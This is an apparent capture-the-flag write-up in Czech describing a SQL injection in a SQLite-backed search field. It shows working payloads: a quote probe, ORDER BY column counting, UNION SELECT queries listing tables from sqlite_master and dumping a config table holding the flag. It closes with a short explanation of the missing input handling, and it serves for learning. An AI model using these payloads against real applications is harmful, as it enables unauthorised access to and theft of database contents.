# SQL Injection – Write-up

## Průzkum

Do vyhledávacího pole jsem zadal znak `'`.

Server vrátil chybu:
`SQL Chyba: unrecognized token: "'"`

Z toho vyplývá, že vstup není ošetřený a je přímo vložen do SQL dotazu → aplikace je zranitelná na SQL Injection.

---

## Zjištění struktury

### Počet sloupců

Použil jsem:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Postupně jsem zvyšoval číslo, dokud nevznikla chyba.
Chyba nastala při `ORDER BY 3`, takže dotaz má **2 sloupce**.

### Názvy tabulek

Použil jsem:

```
' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--
```

Tím jsem získal názvy tabulek v databázi.

---

## Exfiltrace dat

Z nalezených tabulek jsem použil tabulku `config`.

Payload:

```
' UNION SELECT key, value FROM config--
```

Tím se vypsal obsah tabulky včetně vlajky `FLAG{...}`.

---

## Shrnutí

Zranitelnost vzniká, protože aplikace:

* nefiltruje vstup
* vkládá uživatelský vstup přímo do SQL dotazu

Útočník tak může získat strukturu databáze i citlivá data.
